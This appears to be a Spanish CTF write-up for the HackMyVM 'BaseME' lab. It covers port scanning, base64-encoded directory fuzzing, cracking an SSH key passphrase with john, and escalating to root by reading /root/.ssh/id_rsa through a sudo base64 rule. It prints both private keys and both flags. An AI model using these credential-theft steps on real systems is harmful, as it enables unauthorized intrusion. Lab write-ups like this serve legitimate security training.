---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# BaseME HackMyVM (Easy- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-21 03:12 EDT
Nmap scan report for 192.168.1.180
Host is up (0.00042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 ca:09:80:f7:3a:da:5a:b6:19:d9:5c:41:47:43:d4:10 (RSA)
|   256 d0:75:48:48:b8:26:59:37:64:3b:25:7f:20:10:f8:70 (ECDSA)
|_  256 91:14:f7:93:0b:06:25:cb:e0:a5:30:e8:d3:d3:37:2b (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:AE:6E:9E (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.53 seconds
```

Veremos que hay un puerto `80` abierto, por lo que vamos a entrar en el a ver que vemos, entrando a dicha pagina web, veremos esto simplemente:

```
QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK
```

Vemos lo que parece ser un codigo en `Base64` por lo que vamos a decodificarlo de la siguiente forma:

```shell
echo 'QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK' | base64 -d
```

Info:

```
ALL, absolutely ALL that you need is in BASE64.
Including the password that you need :)
Remember, BASE64 has the answer to all your questions.
-lucas
```

Vemos que nos esta diciendo que todo esta en `Base64` incluida la contraseña del usuario, en este caso el usuario que tenemos es `lucas` pero vamos a probar a realizar un poco de `fuzzing`, en este caso como todo tiene que ir en `Base64` vamos a codificar la lista de palabra en `Base64`:

## Gobuster (Base64)

```shell
while read line; do echo "$line" | base64 >> wordlist_base64.txt; done < <WORDLIST>
```

```shell
gobuster dir -u http://<IP>/ -w wordlist_base64.txt -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.180/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                archivo_codificado.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/aWRfcnNhCg==         (Status: 200) [Size: 2537]
/cm9ib3RzLnR4dAo=     (Status: 200) [Size: 25]
Progress: 18992 / 18996 (99.98%)
===============================================================
Finished
===============================================================
```

Veremos que nos ha funcionado, si lo decodificamos veremos que son las siguientes carpetas:

```shell
echo "aWRfcnNhCg==" | base64 -d && echo "cm9ib3RzLnR4dAo=" | base64 -d
```

Info:

```
id_rsa
robots.txt
```

Vemos que uno es el `robots` y el otro un `id_rsa`, vamos a ver si tenemos suerte y fuera un `id_rsa` real, por lo que vamos a probar a entrar.

```
URL = http://<IP>/aWRfcnNhCg==
```

Se nos descargara un archivo codificado en `Base64` que si lo decodificamos veremos lo siguiente:

```shell
echo "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB
QUFBQ21GbGN6STFOaTFqZEhJQUFBQUdZbU55ZVhCMEFBQUFHQUFBQUJCVHhlOFlVTApCdHpmZnRB
ZFBncDhZWkFBQUFFQUFBQUFFQUFBRVhBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFDWkNY
dkVQbk8xCmNiaHhxY3RCRWNCRFpqcXJGZm9sd1ZLbXBCZ1kwN00zQ0s3cE8xMFVnQnNMeVl3QXpK
RXc0ZTZZZ1BOU3lDRFdGYU5US0cKMDdqZ2NncmdncmU4ZVBDTU5GQkNBR2FZSG1MckZJc0tEQ0xJ
NE5FNTR0NThJVUhlWENaejcyeFRvYkwvcHRMazI2UkJuaAo3YkhHMUpqR2x4T2tPNm0rMW9GTkx0
TnVEMlFQbDhzYlp0RXpYNFM5bk5aL2RweVJwTWZtQjczck4zeXlJeWxldlZERXl2CmY3Q1o3b1JP
NDZ1RGdGUHk1VnprbmRDZUpGMll0WkJYZjVnamMyZmFqTVh2cStiOG9sOFJaWjZqSFhBaGlibEJY
d3BBbTQKdkxZZnh6STI3QlpGbm90ZUJuYmR6d1NMNWFwQkY1Z1lXSkFIS2ovSjZNaERqMUdLQUZj
MUFBQUQwTjlVRFRjVXh3TXQ1WApZRklaSzhpZUJMME5PdXdvY2RnYlV1a3RDMjFTZG5TeTZvY1cz
aW1NKzNteldqUGRvQksvSG8zMzl1UG1CV0k1c2JNcnBLCnhrWk1ubCtyY1RiZ3o0c3d2OGdOdUto
VWM3d1RndHJOWCtQTk1kSUFMTnBzeFlMdC9sNTZHSzhSNEo4ZkxJVTUrTW9qUnMKKzFOcllzOEo0
cm5PMXFXTm9KUlpvRGxBYVlxQlY5NWNYb0FFa3dVSFZ1c3RmZ3hVdHJZS3ArWVBGSWd4OG9rTWpK
Z25iaQpOTlczVHp4bHVOaTVvVWhhbEgyREoya2hLREdRVWk5Uk9GY3NFWGVKWHQzbGdwWlp0MWhy
UURBMW84alRYZVM0K2RXN25aCnpqZjNwME03N2IvTnZjWkUrb1hZUTFnNVhwMVFTT1Niait0bG13
NTRMN0VxYjFVaFpnblE3WnNLQ29hWTlTdUFjcW0zRTAKSUpoK0krWnYxZWdTTVMvRE9ISXhPM3Bz
UWtjaUxqa3BhK0d0d1FNbDFaQUpIUWFCNnE3MEpKY0JDZlZzeWtkWTUyTEtESQpweFpZcExabXlE
eDhUVGFBOEpPbXZHcGZOWmtNVTRJMGk1L1pUNjVTUkZKMU5sQkNOd2N3dE9sOWs0UFc1TFZ4TnNH
UkNKCk1KcjhrNUFjMENYMDNmWEVTcG1zVVVWUysvRGovaG50SHc4OWRPOEhjcXFJVUVwZUViZlRX
THZheDBDaVNoM0tqU2NlSnAKKzhnVXlER3ZDa2N5Vm5lVVFqbW1yUnN3UmhUTnh4S1JCWnNla0d3
SHBvOGhEWWJVRUZacXp6TEFRYkJJQWRybDF0dDdtVgp0VkJybXBNNkN3SmR6WUVsMjFGYUs4anZk
eUN3UHI1SFVndHV4clNwTHZuZGNud1BheEpXR2k0UDQ3MUREWmVSWURHY1doCmk2YklDckxRZ2VK
bEhhRVVtclFDNVJkdjAzendJOVU4RFhVWi9PSGI0MFBMOE1YcUJ0VS9iNkNFVTlKdXpKcEJyS1or
aysKdFNuN2hyOGhwcFQydFVTeER2QytVU01tdy9XRGZha2pmSHBvTndoN1B0NWkwY3d3cGtYRlF4
SlB2UjBiTHh2WFpuKzN4dwpON2J3NDVGaEJaQ3NIQ0FiVjIraFZzUDBseXhDUU9qN3lHa0JqYTg3
UzFlMHE2V1pqakI0U3ByZW5Ia083dGc1UTBIc3VNCkFpZi8wMkhIeldHK0NSL0lHbEZzTnRxMXZ5
bHQyeCtZLzA5MXZDa1JPQkRhd2pIei84b2d5MkZ6ZzhKWVRlb0xrSHdER1EKTytUb3dBMTBSQVRl
azZaRUl4aDZTbXRERy9WNXplV0N1RW1LNHNSVDNxMUZTdnBCMS9IK0Z4c0dDb1BJZzhGemNpR0No
MgpUTHVza2NYaWFnbnM5TjFSTE9ubEhoaVpkOFJaQTBaZzdvWklhQnZhWm5oWllHeWNwQUpwV0tl
YmpydG9rTFl1TWZYUkxsCjMvU0FlVWw3MkVBM20xRElueHNQZ3VGdWswMHJvTWM3N042ZXJZN3Rq
T1pMVllQb1NpeWdEUjFBN2Yzell6KzBpRkk0ckwKTkQ4aWtnbVF2RjZocnd3SkJycC8weEtFYU1U
Q0tMdnl5WjNlRFNkQkRQcmtUaGhGd3JQcEk2K0V4OFJ2Y1dJNmJUSkFXSgpMZG1tUlhVUy9EdE8r
NjkvYWlkdnhHQVlvYisxTT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==
" | base64 -d
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL
BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1
cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG
07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh
7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv
f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4
vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X
YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK
xkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs
+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi
NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ
zjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0
IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI
pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ
MJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp
+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV
tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh
i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+
tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw
N7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM
Aif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ
O+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2
TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl
3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL
ND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ
LdmmRXUS/DtO+69/aidvxGAYob+1M=
-----END OPENSSH PRIVATE KEY-----
```

Vemos que efectivamente es un `id_rsa` por lo que vamos a probar a conectarnos con el usuario `lucas` a la maquina victima con su clave privada `PEM`.

```shell
nano id_rsa

#Dentro del nano
<ID_RSA>
```

Lo guardamos y le damos los permisos adecuados a dicho archivo.

```shell
chmod 600 id_rsa
```

Ahora si nos conectaremos por `SSH` de la siguiente forma:

```shell
ssh -i id_rsa lucas@<IP>
```

Si lo intentamos veremos que nos pide una contraseña, por lo que vamos a probar a intentar `crackearla` de la siguiente forma:

## Escalate user lucas

### Crackeo id\_rsa john

Si nos vamos a la pagina principal e inspeccionamos el codigo veremos una lista de palabras:

```html
<!--
iloveyou
youloveyou
shelovesyou
helovesyou
weloveyou
theyhatesme
-->
```

Vamos a codificarlas en `Base64` y probar a ver si fuera alguna la contraseña del `id_rsa`.

```shell
ssh2john id_rsa > hash.id_rsa
```

> list.txt

```
iloveyou
youloveyou
shelovesyou
helovesyou
weloveyou
theyhatesme
```

```shell
while read line; do echo "$line" | base64 >> list_code.txt; done < list.txt
```

Ahora vamos a pasarle al lista codificada a `john`.

```shell
john --wordlist=list_code.txt hash.id_rsa
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
aWxvdmV5b3UK     (id_rsa)     
1g 0:00:00:00 DONE (2025-04-21 03:40) 2.564g/s 15.38p/s 15.38c/s 15.38C/s aWxvdmV5b3UK..dGhleWhhdGVzbWUK
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, por lo que vamos a probar a meter dicha contraseña en `Base64` directamente.

### SSH

```shell
ssh -i id_rsa lucas@<IP>
```

Metemos como contraseña `aWxvdmV5b3UK` y veremos que estamos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
                                  .     **                                     
                                *           *.                                  
                                              ,*                                
                                                 *,                             
                         ,                         ,*                           
                      .,                              *,                        
                    /                                    *                      
                 ,*                                        *,                   
               /.                                            .*.                
             *                                                  **              
             ,*                                               ,*                
                **                                          *.                  
                   **                                    **.                    
                     ,*                                **                       
                        *,                          ,*                          
                           *                      **                            
                             *,                .*                               
                                *.           **                                 
                                  **      ,*,                                   
                                     ** *,                                      
                                               
HMV8nnJAJAJA
```

## Escalate Privileges

SI hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for lucas on baseme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucas may run the following commands on baseme:
    (ALL) NOPASSWD: /usr/bin/base64
```

Veremos que podremos ejecutar `Base64` como el usuario `root`, con esto lo que podremos hacer sera leer archivos del sistema sin ningun tipo de restriccion, por lo que vamos a probar a intentar leer la `id_rsa` de `root` si la tuviera, a ver si hay suerte.

```shell
LFILE=/root/.ssh/id_rsa
sudo base64 "$LFILE" | base64 --decode
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2B
IdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxp
DEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk
/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7
px+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9a
S+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ
7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRx
YQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8v
zEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO
4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpig
yLAJLeOGZ4UbgL+nnWPeAjpvzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6
oBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5
SEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDr
nCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9R
iMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLq
vWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oG
ptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuz
X2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axR
fKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExD
SiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCe
FWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5
rFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIR
txBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an
2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU=
-----END OPENSSH PRIVATE KEY-----
```

Y vemos que funciona, por lo que nos vamos a conectar por `SSH` mediante la `id_rsa` de `root`.

```shell
nano id_rsa

#Dentro del nano

<ID_RSA_ROOT>
```

Lo guardamos y le establecemos los permisos necesarios para que se comporte como una `id_rsa` real.

```shell
chmod 600 id_rsa
```

Ahora nos conectamos por `SSH` mediante el usuario `root` pasandole como parametro dicha `id_rsa`.

```shell
ssh -i id_rsa root@<IP>
```

Info:

```
Linux baseme 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 28 12:47:13 2020 from 192.168.1.59
root@baseme:~# whoami
root
```

Con esto ya seremos el usuario `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
                                   .     **                                     
                                *           *.                                  
                                              ,*                                
                                                 *,                             
                         ,                         ,*                           
                      .,                              *,                        
                    /                                    *                      
                 ,*                                        *,                   
               /.                                            .*.                
             *                                                  **              
             ,*                                               ,*                
                **                                          *.                  
                   **                                    **.                    
                     ,*                                **                       
                        *,                          ,*                          
                           *                      **                            
                             *,                .*                               
                                *.           **                                 
                                  **      ,*,                                   
                                     ** *,                                      
                                               
HMVFKBS64
```
